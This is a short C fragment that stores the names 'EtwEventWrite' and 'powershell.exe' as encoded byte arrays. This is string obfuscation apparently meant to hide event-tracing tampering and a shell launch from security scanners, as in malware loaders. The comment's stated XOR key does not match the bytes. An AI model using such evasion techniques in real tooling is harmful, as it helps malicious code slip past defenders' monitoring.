...
static const unsigned char xEtwEventWrite[] = {
    0xF2, 0xC3, 0xC0, 0xF2, 0xC1, 0xD2, 0xD9, 0xC3,
    0xE0, 0xC5, 0xDE, 0xC3, 0xD2
};
#define xEtwEventWrite_LEN 13

/* "powershell.exe" XOR 0x41 */
static const unsigned char xPowerShell[] = {
    0xC7, 0xD8, 0xC0, 0xD2, 0xC5, 0xC4, 0xDF, 0xD2,
    0xDB, 0xDB, 0x99, 0xD2, 0xCF, 0xD2
};
